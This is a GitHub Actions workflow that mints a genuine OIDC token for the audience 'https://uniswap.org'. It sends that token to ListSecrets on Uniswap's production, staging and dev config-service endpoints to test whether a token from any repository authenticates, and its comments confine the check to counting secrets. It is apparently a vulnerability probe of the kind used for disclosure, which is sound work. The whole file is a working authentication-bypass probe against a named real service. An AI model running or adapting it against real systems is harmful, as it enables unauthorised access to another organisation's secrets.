# Put this at .github/workflows/oidc-probe.yml in a repo YOU own (a throwaway is fine).
# It mints a genuine GitHub Actions OIDC token for audience https://uniswap.org - the exact
# audience Uniswap's Config Service validates - and makes ONE metadata-only call.
#
# ListSecrets returns names + key COUNTS only, never values. A 200 is by itself proof that
# authentication succeeded; do not escalate to GetSecretValue.

name: oidc-probe

on:
  workflow_dispatch:

permissions:
  id-token: write        # required for OIDC minting
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Mint OIDC token and probe the config service
        uses: actions/github-script@v7
        with:
          script: |
            const token = await core.getIDToken('https://uniswap.org')

            // Decode the payload locally so we can record exactly which claims we sent.
            const claims = JSON.parse(
              Buffer.from(token.split('.')[1], 'base64url').toString('utf8')
            )
            core.info('claims we are presenting:')
            for (const k of ['iss','aud','sub','repository','repository_owner','workflow','ref','job_workflow_ref']) {
              core.info(`  ${k} = ${JSON.stringify(claims[k])}`)
            }

            for (const env of ['prod','staging','dev']) {
              const url = `https://entry-gateway.backend-${env}.api.uniswap.org` +
                          `/configservice.v1.SecretsService/ListSecrets`
              const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json',
                           'Authorization': `Bearer ${token}` },
                body: JSON.stringify({ prefix: '' }),
              })
              const text = await res.text()

              // Print status + how many secrets were listed. Never print the body wholesale.
              let summary = text.slice(0, 200)
              try {
                const j = JSON.parse(text)
                if (Array.isArray(j.secrets)) {
                  summary = `*** AUTHENTICATED *** ${j.secrets.length} secrets listed`
                } else if (j.message) {
                  summary = j.message
                }
              } catch {}
              core.info(`${env.padEnd(8)} HTTP ${res.status}  ${summary}`)
            }
